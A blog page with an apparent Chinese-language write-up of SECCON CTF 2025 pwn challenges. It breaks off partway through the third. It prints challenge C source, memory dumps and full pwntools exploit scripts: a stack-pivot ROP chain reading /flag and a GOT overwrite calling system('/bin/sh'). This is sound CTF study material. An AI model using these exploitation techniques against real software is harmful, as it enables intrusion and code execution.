<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>secconCTF2025 PWN Writeup' | Wgg's Blog Site</title>
<meta name=keywords content><meta name=description content='secconCTF 2025 PWN Writeup
unserialize
题目源码
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  char szbuf[0x20];
  char *tmpbuf;

  for (size_t i = 0; i < sizeof(szbuf); i++) {
    szbuf[i] = fgetc(fp);
    if (szbuf[i] == &#39;:&#39;) {
      szbuf[i] = 0;
      break;
    }
    if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) {
      return -1;
    }
  }

  if (atoi(szbuf) > size) {
    return -1;
  }

  tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));

  size_t sz = strtoul(szbuf, NULL, 10);
  for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
  }

  memcpy(buf, tmpbuf, sz);
  return sz;
}

int main() {
  char buf[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  if (unserialize(stdin, buf, sizeof(buf)) < 0) {
    puts("[-] Deserialization faield");
  } else {
    puts("[+] Deserialization success");
  }
  
  return 0;
}
题目保护
[*] &#39;/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall&#39;
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
漏洞点在'><meta name=author content="Me"><link rel=canonical href=https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/"><meta property="og:site_name" content="Wgg's Blog Site"><meta property="og:title" content="secconCTF2025 PWN Writeup'"><meta property="og:description" content='secconCTF 2025 PWN Writeup unserialize 题目源码
#include <ctype.h> #include <stdio.h> #include <stdlib.h> #include <string.h> ssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i < sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == &#39;:&#39;) { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) > size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i < sz; i++) { if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } int main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) < 0) { puts("[-] Deserialization faield"); } else { puts("[+] Deserialization success"); } return 0; } 题目保护
[*] &#39;/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 漏洞点在'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-15T23:00:24+08:00"><meta property="article:modified_time" content="2025-12-15T23:00:24+08:00"><meta property="og:image" content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="secconCTF2025 PWN Writeup'"><meta name=twitter:description content='secconCTF 2025 PWN Writeup
unserialize
题目源码
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  char szbuf[0x20];
  char *tmpbuf;

  for (size_t i = 0; i < sizeof(szbuf); i++) {
    szbuf[i] = fgetc(fp);
    if (szbuf[i] == &#39;:&#39;) {
      szbuf[i] = 0;
      break;
    }
    if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) {
      return -1;
    }
  }

  if (atoi(szbuf) > size) {
    return -1;
  }

  tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));

  size_t sz = strtoul(szbuf, NULL, 10);
  for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
  }

  memcpy(buf, tmpbuf, sz);
  return sz;
}

int main() {
  char buf[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  if (unserialize(stdin, buf, sizeof(buf)) < 0) {
    puts("[-] Deserialization faield");
  } else {
    puts("[+] Deserialization success");
  }
  
  return 0;
}
题目保护
[*] &#39;/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall&#39;
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
漏洞点在'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wgggggggg.github.io/posts/"},{"@type":"ListItem","position":2,"name":"secconCTF2025 PWN Writeup'","item":"https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"secconCTF2025 PWN Writeup'","name":"secconCTF2025 PWN Writeup\u0027","description":"secconCTF 2025 PWN Writeup unserialize 题目源码\n#include \u0026lt;ctype.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; ssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i \u0026lt; sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == \u0026#39;:\u0026#39;) { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) \u0026gt; size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i \u0026lt; sz; i++) { if (fscanf(fp, \u0026#34;%02hhx\u0026#34;, tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } int main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) \u0026lt; 0) { puts(\u0026#34;[-] Deserialization faield\u0026#34;); } else { puts(\u0026#34;[+] Deserialization success\u0026#34;); } return 0; } 题目保护\n[*] \u0026#39;/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 漏洞点在\n","keywords":[],"articleBody":"secconCTF 2025 PWN Writeup unserialize 题目源码\n#include #include #include #include ssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i \u003c sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == ':') { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) \u003e size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i \u003c sz; i++) { if (fscanf(fp, \"%02hhx\", tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } int main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) \u003c 0) { puts(\"[-] Deserialization faield\"); } else { puts(\"[+] Deserialization success\"); } return 0; } 题目保护\n[*] '/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 漏洞点在\ntmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); strtoul函数用于将字符串转换成一个 unsigned long int类型的数\n其中第三个参数是base，输入0表示表示自动判断进制，如0x开头是十六进制，0开头但是没有x是八进制，非0开头则视为十进制\n所以当我们输入0256时，会分配空间为0256 == 174的空间，但是会读入256字节大小的内容，所以造成了越界\n所以越界写ROP就好了，不够长就再来个栈迁移嘛……真的是这样吗\n让我们在IDA里面看一下内存布局及反编译\n这是越界写时的for循环，以及返回前的memcpy其中有用到index, size, stdina, src, target等局部变量，也就是说我们在越界写的过程中，会覆盖这些变量。\n接下来再看看这些变量的内存布局\n在越界写的过程中，首当其中的就是target变量，这决定了我们越界写的内容会被memcpy到什么位置，再来是index，src，size。\nindex和src共同决定了我们的下一个字节会被写到什么位置，size决定了我们能溢出写多少字节。\n看一下写了0xd0个A时候的内存情况\npwndbg\u003e x/60gx 0x7ffcade16390 0x7ffcade16390:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163a0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163b0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163c0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163d0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163e0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade163f0:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16400:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16410:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16420:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16430:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16440:\t0x4141414141414141\t0x4141414141414141 0x7ffcade16450:\t0x4141414141414141\t0x0041414141414141 0x7ffcade16460:\t0x00007ffcade164d0(target)\t0x00000000004ca440(stdina) 0x7ffcade16470:\t0x0000000000000004\t0x00000000000000cf(index) 0x7ffcade16480:\t0x00007ffcade16390(src)\t0x0000000000000100(size) 0x7ffcade16490:\t0x00007f0036353230\t0x000000000045afcb 0x7ffcade164a0:\t0x0000000000000001\t0x00007ffcade166f8 0x7ffcade164b0:\t0x00007ffcade16708\t0x43435d9e4e8fbe00(canary) 0x7ffcade164c0:\t0x00007ffcade165e0(saved rbp)\t0x0000000000401c1f(saved rip) 0x7ffcade164d0:\t0x0000000000000000\t0x00000000004c5ee0 0x7ffcade164e0:\t0x0000000000000000\t0x00000000004193ac 0x7ffcade164f0:\t0x0000000000000000\t0x000000003d342ff0 0x7ffcade16500:\t0x00000000004ca700\t0x0000000000021020 0x7ffcade16510:\t0x000000003d342fe0\t0x00000000004193ac 0x7ffcade16520:\t0x0000000000000100\t0x0000000000000000 0x7ffcade16530:\t0x00007ffcade16560\t0x43435d9e4e8fbe00 0x7ffcade16540:\t0x000000003d342ff0\t0x00000000004ca700 0x7ffcade16550:\t0x0000000000000100\t0x0000000000000000 0x7ffcade16560:\t0x00000000004d10b0\t0x43435d9e4e8fbe00 思路1：在本函数内ROP（X）\ntarget，假如要在本函数内ROP，可以随便覆盖为bss上一个合法地址，不是阻碍\nindex\n考虑直接覆盖index到返回地址处？注意此时index已经是0xcf，而AAAAAAAA距离返回地址还有足足0x70，显然不行。\n考虑覆盖index到size处，然后改size，这样就可以覆盖很多字节了，足足写好一份ROP，但是，这题有canary，这样无法绕过canary\n考虑将src改到返回地址处，这是一个好办法，并且可以绕过canary，也可以多写挺多字节，但是再多看几次ASLR下的布局（仅src到saved rip）\n------------------------------------------------------------- 0x7ffc2f5961f0:\t0x00007ffc2f596100\t0x0000000000000100 0x7ffc2f596200:\t0x00007f0036353230\t0x000000000045afcb 0x7ffc2f596210:\t0x0000000000000001\t0x00007ffc2f596468 0x7ffc2f596220:\t0x00007ffc2f596478\t0x7df044b93da75900 0x7ffc2f596230:\t0x00007ffc2f596350\t0x0000000000401c1f ------------------------------------------------------------- 0x7ffcfbb2cd30:\t0x00007ffcfbb2cc40\t0x0000000000000100 0x7ffcfbb2cd40:\t0x00007f0036353230\t0x000000000045afcb 0x7ffcfbb2cd50:\t0x0000000000000001\t0x00007ffcfbb2cfa8 0x7ffcfbb2cd60:\t0x00007ffcfbb2cfb8\t0xa1955e6370df8e00 0x7ffcfbb2cd70:\t0x00007ffcfbb2ce90\t0x0000000000401c1f ------------------------------------------------------------- 0x7ffd57b0d660:\t0x00007ffd57b0d570\t0x0000000000000100 0x7ffd57b0d670:\t0x00007f0036353230\t0x000000000045afcb 0x7ffd57b0d680:\t0x0000000000000001\t0x00007ffd57b0d8d8 0x7ffd57b0d690:\t0x00007ffd57b0d8e8\t0x32db520c4fa1d400 0x7ffd57b0d6a0:\t0x00007ffd57b0d7c0\t0x0000000000401c1f 最后3个nibble分别得0x100-\u003e0x238，0xc40-\u003e0xd78，0x570-\u003e0x6a8 也就是说我们得写4个nibble（毕竟没法写半个byte），所以得是一个1/pow(2, 12)爆破这并不好\n综上所述直接在本函数ROP是不可能得\n思路2：在main函数ROP\nmain函数buf分配了0x100字节，直接歇逼了 思路3：栈迁移\n覆盖target为bss地址，覆盖返回地址为leave; ret，但是还有一个问题就是我们怎样把输入输入到返回地址，并且绕过canary。直接修改index到返回地址是不可行的，被size限制了，修改size之后就不可避免的会改到canary。所以办法只有修改src，但是这道题栈地址的最后一个byte也会随机化，所以是1/16爆破（有时候仅最后一个字节不同，可以看上面的case）。 还有一点是这题是静态编译，且没有system，execve，只能打ORW\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chall\" libcname = \"./libc.so.6\" host = \"unserialize.seccon.games\" port = 5000 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' ''' def base(name, data, offset): if isinstance(data, bytes): if name == \"canary\": base = u64(data) else: base = u64(data + b'\\x00' * 2) - offset elif isinstance(data, int): base = data - offset log.success(f\"{name} = \" + hex(base)) return base def format_extract(data): return int(re.search(b'0x[0-9a-fA-F]{12}', data).group(0), base = 16) def sa(io, a, b): io.sendafter(a, b) def sla(io, a, b): io.sendlineafter(a, b) def ru(io, a): io.recvuntil(a) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def make_payload(data, length): hex_data = data.hex() length = length.decode(\"ASCII\") payload = f\"{length}:{hex_data}\" return payload.encode() # 转回 bytes 发送 for i in range(0x100000): #从栈迁移到got下方 try: io = start() neg_len = 0x200 rdi_rbp_ret = 0x0000000000402418 rsi_ret = 0x000000000043617e rdx_oral_r12_rbp_ret = 0x000000000049a324 #x0000000000498cb8 : mov rcx, rbx ; mov edi, 1 ; call rax rax_ret = 0x00000000004303ab mprotect = elf.sym['mprotect'] open = elf.sym['open'] read = elf.sym['read'] write = elf.sym['write'] ROP_chain = flat([ p64(rdi_rbp_ret), p64(0x4cd000 + 0x91 - 6) * 2, p64(rsi_ret), p64(0), p64(open), p64(rdi_rbp_ret), p64(0)* 2, p64(rsi_ret), p64(0x4cd07f), p64(rdx_oral_r12_rbp_ret), p64(0x100) * 2, p64(0x4d0000), p64(read), p64(rsi_ret + 1) ]) #0xd0 leave_ret = 0x401BB9 payload = make_payload((b'A' * 0x3f + ROP_chain.ljust(0x91 - 6, b'\\x00') + b'/flag\\x00' + p64(0x4cd000) + p64(0x00000000004ca440) + b'A' * 8 + p64(0xe8) + b'\\x5f' + p64(0x4cd000 - 8) + p64(leave_ret)), b'0256') #payload = make_payload((b'A' * 0xd0), b'0256') #payload = make_payload((b'A' * 0xd0 + p64(0x4cd000) + p64(0x00000000004ca440)), b'0256') payload2 = flat([ p64(rdi_rbp_ret), p64(3)* 2, p64(rsi_ret), p64(0x4cd07f), p64(rdx_oral_r12_rbp_ret), p64(0x60) * 2, p64(0x4d0000), p64(read), p64(rdi_rbp_ret), p64(2), p64(0x4e0000), p64(write), p64(rsi_ret + 1) ]) io.send((payload + payload2)[:0x100]) io.send((payload + payload2)[0x100:]) flag = io.recv(0x60) if b\"{\" in flag: # flags.append(flag) print(flag) io.interactive() #可以卡在这里 except: io.close() #关闭，然后重开 print(i) #记录一下次数 gachiarray 题目源码\n#include #include #include #include #include #include typedef union { struct { int32_t capacity; int32_t size; int32_t initial; }; struct { int32_t op; int32_t index; int32_t value; }; } pkt_t; struct { uint32_t size; uint32_t capacity; int32_t initial; int32_t *data; } g_array; void fatal(const char *msg) { fprintf(stderr, \"[ERROR] %s\\n\", msg); exit(1); } void read_packet(pkt_t *pkt) { if (read(0, pkt, sizeof(pkt_t)) != sizeof(pkt_t)) fatal(\"Truncated input\"); } void array_init(pkt_t *pkt) { if (pkt-\u003esize \u003e pkt-\u003ecapacity) pkt-\u003esize = pkt-\u003ecapacity; g_array.data = (int*)malloc(pkt-\u003ecapacity * sizeof(int)); if (!g_array.data) *(uint64_t*)pkt = 0; g_array.size = pkt-\u003esize; g_array.capacity = pkt-\u003ecapacity; g_array.initial = pkt-\u003einitial; for (size_t i = 0; i \u003c pkt-\u003esize; i++) g_array.data[i] = pkt-\u003einitial; printf(\"Initialized: size=%d capacity=%d\\n\", pkt-\u003esize, pkt-\u003ecapacity); } void main() { pkt_t pkt; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); read_packet(\u0026pkt); array_init(\u0026pkt); while (1) { read_packet(\u0026pkt); switch (pkt.op) { case 1: // get if (g_array.size \u003c= pkt.index) fatal(\"Out-of-bounds\"); printf(\"array[%d] = %d\\n\", pkt.index, g_array.data[pkt.index]); break; case 2: // set if (g_array.size \u003c= pkt.index) fatal(\"Out-of-bounds\"); g_array.data[pkt.index] = pkt.value; printf(\"array[%d] = %d\\n\", pkt.index, pkt.value); break; case 3: // resize if (g_array.capacity \u003c pkt.size) fatal(\"Over capacity\"); for (int i = g_array.size; i \u003c pkt.size; i++) g_array.data[i] = g_array.initial; g_array.size = pkt.size; printf(\"New size set to %d\\n\", pkt.size); break; default: exit(0); } } } 程序保护\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled SHSTK: Enabled IBT: Enabled Stripped: No 看似有很多signed compare，看了汇编，实际上绝大多数都是unsigned compare，只有一个是signed compare，就是这个for循环\nfor (int i = g_array.size; i \u003c pkt.size; i++) g_array.data[i] = g_array.initial; 而漏洞点是\ng_array.data = (int*)malloc(pkt-\u003ecapacity * sizeof(int)); if (!g_array.data) *(uint64_t*)pkt = 0; malloc失败后并没有直接error，只是把*pkt = 0\n如果我们输入capacity为-1，那capacity后面就会是一个非常大的整数，malloc也会失败，通过case3\ncase 3: // resize if (g_array.capacity \u003c pkt.size) fatal(\"Over capacity\"); for (int i = g_array.size; i \u003c pkt.size; i++) g_array.data[i] = g_array.initial; g_array.size = pkt.size; printf(\"New size set to %d\\n\", pkt.size); break; 也能成功把size给resize成一个特别大的整数（比如-2）（这个for循环是signed compare很关键，输入size为-2不会进行任何一次赋值，也就不会进行非法内存的写入，不会循环pow(2, 32) - 2次直接爆掉）\n又因为这题是NO PIE，所以现在已经可以bss任意读写了。\n通过got泄露libc\n写malloc为system，exit为main，再往bss地址存个/bin/sh\n触发exit再次进入main函数，然后输入的capacity为bss // 4即可get shell\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chall\" + \"_patched\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\" host = \"gachiarray.seccon.games\" port = 5000 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' b *0x4013FE set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/glibc-source_2.39-0ubuntu8.4_all/usr/src/glibc/glibc-2.39 ''' def base(name, data, offset): if isinstance(data, bytes): if name == \"canary\": base = u64(data) else: base = u64(data + b'\\x00' * 2) - offset elif isinstance(data, int): base = data - offset log.success(f\"{name} = \" + hex(base)) return base def format_extract(data): return re.search(b'0x[0-9a-fA-F]{12}', data).group(1) def sa(io, a, b): io.sendafter(a, b) def sla(io, a, b): io.sendlineafter(a, b) def ru(io, a): io.recvuntil(a) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def recv_number(io): buf = b\"\" while True: # 每次只读 1 个字节 try: c = io.recv(1, timeout=0.5) # 设置个 timeout 防止卡死 except: break if not c: break # 如果是数字，或者是开头的负号 if c.isdigit() or (c == b'-' and buf == b\"\"): buf += c else: # 遇到了非数字（比如空格、换行、字母） # 【关键】把这个字符放回去，给后面的逻辑用 io.unrecv(c) break if not buf: return 0 # 或者抛出异常 return int(buf) def create_packet(field1, field2, field3): \"\"\" 通用发包函数。 因为是 Union 结构，我们总是发送 3 个 32位整数 (共12字节) \"\"\" # p32() 将整数转换为 4字节的小端序二进制数据 payload = p32(field1, sign='signed') + \\ p32(field2, sign='signed') + \\ p32(field3,) return payload io = start() malloc_got = 0x404010 exit_got = 0x404020 rbp_ret = 0x000000000040134d printf_got = 0x404018 main = 0x4010F0 bss = 0x404200 io.send(create_packet(-2, 0, 0xAAAA)) io.send(create_packet(3, -2, 0)) io.send(create_packet(1, malloc_got // 4, 0)) io.recvuntil(\"array[1052676] = \") low = recv_number(io) io.send(create_packet(1, (malloc_got + 0x4) // 4, 0)) io.recvuntil(\"array[1052677] = \") high = recv_number(io) libc_base = (high \u003c\u003c 32) | (low \u0026 0xffffffff) - 0x00000000000ad650 log.success(\"libc_base: \" + hex(libc_base)) one_gadget = libc_base + 0xd4f5f system = libc_base + libc.sym['system'] io.send(create_packet(2, exit_got // 4, main \u0026 0xffffffff)) io.send(create_packet(2, (exit_got + 0x4) // 4, main \u003e\u003e 32)) sleep(0.1) io.send(create_packet(2, malloc_got // 4, system \u0026 0xffffffff)) io.send(create_packet(2, (malloc_got + 0x4) // 4, system \u003e\u003e 32)) sleep(0.1) io.send(create_packet(2, bss // 4, u32(b'/bin'))) io.send(create_packet(2, (bss + 0x4) // 4, u32(b'/sh\\x00'))) sleep(0.1) io.send(create_packet(4, (exit_got + 0x4) // 4, one_gadget \u0026 0xffffffff)[:-1]) sleep(0.1) io.send(create_packet(bss // 4, bss // 4, bss // 4)) io.interactive() 这题出现了本地通远程不通的情况，原因是没有sleep(0.1)，也算是学到了吧。以后遇到本地通远程不通也可以本地build 一下docker打一下试试看，调试看是什么问题。\ncursedST 题目源码\n#include #include std::string name; std::stack\u003csize_t\u003e S, T; int main() { size_t op, val; std::cout \u003c\u003c \"What's your name?\" \u003c\u003c std::endl; std::cin \u003e\u003e name; std::cout \u003c\u003c \"Hello, \" \u003c\u003c name \u003c\u003c \"!\" \u003c\u003c std::endl; while (std::cin.good()) { std::cin \u003e\u003e op; if (op == 1) { std::cin \u003e\u003e val; S.push(val); } else if (op == 2) { S.pop(); } else if (op == 3) { std::cin \u003e\u003e val; T.push(val); } else if (op == 4) { T.pop(); } else { break; } } return 0; } 程序保护\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 显然，问题出现在没有检查stack是不是空的就进行pop，所以想要pwn下来这道题首先得了解std::stack。\nstd::stack是通过std::deque实现的，先给出两个结构体（再给一个std::string的，也会用到），再给出AI生成的我觉得很好理解的回答\n// Deque 迭代器结构 (0x20 bytes) struct _Deque_iterator { unsigned long *cur; // +0x00: 当前位置指针 unsigned long *first; // +0x08: buffer 起始 unsigned long *last; // +0x10: buffer 结束 unsigned long **node; // +0x18: map 中的 node 指针 }; // Deque 主结构 (0x60 bytes) struct std_deque { unsigned long **_M_map; // +0x00: map 数组指针 unsigned long _M_map_size; // +0x08: map 大小 struct _Deque_iterator _M_start; // +0x10: 起始迭代器 struct _Deque_iterator _M_finish; // +0x30: 结束迭代器 }; class string { // 1. 字符串的实际指针（指向下面 Union 中的 local_buf 或 堆地址） char* _M_p; // 2. 长度 (size) size_t _M_string_length; // 3. 核心存储区：这是一个联合体，同一时间只能用其中一种 union { // [模式 A: 长字符串] // 当字符串很长时，这里存储容量(capacity) // 数据存储在 _M_p 指向的堆内存中 size_t _M_allocated_capacity; // [模式 B: 短字符串 (SSO)] // 当字符串很短（\u003c= 15 char）时，直接存在这个数组里！ // 此时 _M_p 指向这个 local_buf 的首地址 char _M_local_buf[16]; }; }; 这是gemini生成的回答，有助于理解。\n这是一个非常硬核的视角！你提供的结构体正是逆向工程（如使用 IDA Pro）时常见的 C++ 标准库（特别是 GCC libstdc++）中 `std::deque` 的内存布局。 由于 `std::stack` 默认只是 `std_deque` 的一个包装壳，**`std::stack` 的内存布局 = `std_deque` 的内存布局**。 所有的 `push` 和 `pop` 操作，本质上都是在操纵 `_M_finish` 这个迭代器，以及背后的 `_M_map`（中控器）。 我们用一个具体的场景，结合你提供的结构体字段，来演示内存是如何变化的。 ------ ### 场景设定 假设： 1. 我们存储的是 `unsigned __int64` (8字节)。 2. 为了演示方便，假设一个**Buffer (数据块)** 只能存 **8个元素** (实际通常是 512字节)。 3. **Map (中控数组)** 已经分配好。 ------ ### 阶段 1: 初始化 (空栈) 当你声明 `std::stack S;` 时，内存里发生的事情： 1. **`_M_map`**: 分配一个小数组（比如存8个指针）。 2. **分配第一个 Buffer**: 假设地址为 `0x1000`。 3. **初始化迭代器**: `_M_start` 和 `_M_finish` 都指向这个 Buffer 的中间（为了支持双端插入，虽然 stack 只用一端）。 **内存快照：** - **`_M_map`**: 指向 `[NULL, NULL, 0x1000, NULL ...]` - **`_M_finish` 结构体内容 (当前栈顶指针)**: - `node`: 指向 `_M_map` 中存 `0x1000` 的那个位置。 - `first`: `0x1000` (当前 Buffer 起始) - `last`: `0x1040` (当前 Buffer 结束, 0x1000 + 8*8) - `cur`: `0x1000` (当前指向位置，表示下一个写入点) ------ ### 阶段 2: 正常的 `push(10)` (Buffer 未满) 执行 `S.push(10)`。实际上是操作 `_M_finish`。 **操作步骤：** 1. **写入数据**: 将 `10` 写入 `_M_finish.cur` 指向的地址 (`0x1000`)。 2. **移动指针**: `_M_finish.cur` 自增 8字节 (`unsigned __int64`的大小)。 **内存变化：** - 地址 `0x1000` 的值变更为 `10`。 - `_M_finish.cur` 变为 `0x1008`。 - `_M_finish.node`, `first`, `last` **保持不变** (还在同一个 Buffer 里)。 ------ ### 阶段 3: 跨越边界的 `push(99)` (触发新 Buffer 分配) 假设我们已经 push 了 8 次，Buffer 满了。 此时 `_M_finish.cur` 等于 `_M_finish.last` (即 `0x1040`)。 现在执行 `S.push(99)`。**这是 deque 最精髓的地方。** **操作步骤：** 1. **检测**: 发现 `cur == last`，当前 Buffer 已无空间。 2. **分配新 Buffer**: 系统 `malloc` 一块新内存，地址 `0x2000`。 3. **更新 Map**: 将 `0x2000` 填入 `_M_map` 的下一个空槽位。 4. **跳跃 (核心)**: 更新 `_M_finish` 迭代器，让它“跳”到新 Buffer。 **内存变化 (修改 `_M_finish` 结构体)：** - `node`: 指针移向 `_M_map` 的下一格 (指向存 `0x2000` 的地方)。 - `first`: 变为 `0x2000` (新 Buffer 起始)。 - `last`: 变为 `0x2040` (新 Buffer 结束)。 - `cur`: 变为 `0x2000` 